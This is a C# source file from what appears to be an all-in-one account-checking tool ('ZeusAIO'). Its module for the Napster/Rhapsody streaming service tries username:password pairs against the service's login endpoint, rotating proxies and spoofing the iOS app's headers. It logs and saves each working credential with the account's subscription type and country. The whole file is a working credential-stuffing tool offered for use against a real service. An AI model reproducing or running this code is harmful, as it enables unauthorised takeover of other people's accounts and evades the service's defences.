using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;        //nope
using ZeusAIO;
using TunnelBear;


namespace Napster
{
    class Check
    {

        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.UserAgent = "Napster/3537 CFNetwork/1120 Darwin/19.0.0";
                            req.AddHeader("Host", "playback.rhapsody.com");
                            req.AddHeader("appId", "com.rhapsody.iphone.Rhapsody3");
                            req.AddHeader("appVersion", "6.5");
                            req.AddHeader("cpath", "app_iPad7_4");
                            req.AddHeader("deviceid", "4387508C-483B-479A-BBC1-E078269AE0S4");
                            req.AddHeader("ocode", "tablet_ios");
                            req.AddHeader("package_name", "com.rhapsody.iphone.Rhapsody3");
                            req.AddHeader("pcode", "tablet_ios");
                            req.AddHeader("playerType", "ios_6_5");
                            req.AddHeader("provisionedMCCMNC", "310+150");
                            req.AddHeader("rsrc", "ios_6.5");

                            var res = req.Post("https://playback.rhapsody.com/login.json", string.Concat(new string[]
                               {
                           "username=" + s[0] + "&password=" + s[1] + "&devicename=Elite%20Money&provisionedMCCMNC=310%2B150&package_name=com.rhapsody.iphone.Rhapsody3"
                               }), "application/x-www-form-urlencoded").ToString();

                            switch (res)
                            {
                                case string a when res.Contains("INVALID_USERNAME_OR_PASSWORD"):
                                    break;
                                case string b when res.Contains("rhapsodyAccessToken"):
                                    string text3 = Check.Parse(res, "{\"accountType\":\"", "\"");
                                    string text5 = Check.Parse(res, "\"country\":\"", "\"");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - NAPSTER] " + s[0] + ":" + s[1] + " | Sub: " + text3 + " | Country: " + text5, Color.Green);
                                    }
                                    Export.AsResult("/Napster_hits", s[0] + ":" + s[1] + " | Sub: " + text3 + " | Country: " + text5);
                                    return false;
                                    break;
                                default:
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                            }
                        }
                    }
                    catch (Exception err)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
            private static string Parse(string source, string left, string right)
            {
                return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
                {
                right
                }, StringSplitOptions.None)[0];
            }
        }
    }


         